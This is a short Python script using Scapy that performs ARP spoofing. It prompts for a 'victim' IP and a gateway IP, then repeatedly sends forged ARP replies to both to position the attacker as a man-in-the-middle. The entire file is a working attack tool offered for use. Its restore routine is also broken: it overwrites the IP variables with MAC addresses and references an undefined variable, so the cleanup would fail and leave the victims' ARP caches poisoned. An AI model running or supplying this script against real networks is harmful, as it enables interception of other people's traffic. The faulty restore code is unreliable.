#!/usr/bin/env python

import scapy.all as scapy
import time

target_ip = input("Enter the IP of victim > ")
gateway_ip = input("Enter the IP of the gateway or router > ")

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_ip = get_mac(destination_ip)
    source_ip = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_ip, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets sent "+str(sent_packets_count), end ="")
        time.sleep(2)

except KeyboardInterrupt:
    print("\nCtrl + C pressed..............Exiting")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    print("[+] Arp Spoof Stopped...")
    print("[+] Thanks For Using... <3")
